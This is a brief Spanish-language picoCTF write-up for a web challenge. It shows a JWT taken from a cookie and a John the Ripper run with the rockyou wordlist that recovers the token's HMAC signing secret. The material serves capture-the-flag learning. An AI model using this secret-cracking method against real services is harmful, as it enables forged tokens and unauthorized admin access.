Check the admin scratchpad!

[http://fickle-tempest.picoctf.net:50592](http://fickle-tempest.picoctf.net:50592/)
## Solución
Probar con cookies, para luego utilizar john para desencriptar la contraseña:
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.gtqDl4jVDvNbEe_JYEZTN19Vx6X9NNZtRVbKPBkhO-s

┌──(dastruker㉿MSI)-[/mnt/c/Users/adomi]
└─$ john jwt -w=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (HMAC-SHA256 [password is key, SHA256 512/512 AVX512BW 16x])
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepico        (?)
1g 0:00:00:00 DONE (2026-09-14 11:10) 1.123g/s 8339Kp/s 8339Kc/s 8339KC/s iluve.p..ilobasco19
Use the "--show" option to display all of the cracked passwords reliably
Session completed.



```


## Notas Adicionales
Diccionario para contraseñas rockyou.txt

## Referencias
https://jwt.lannysport.net/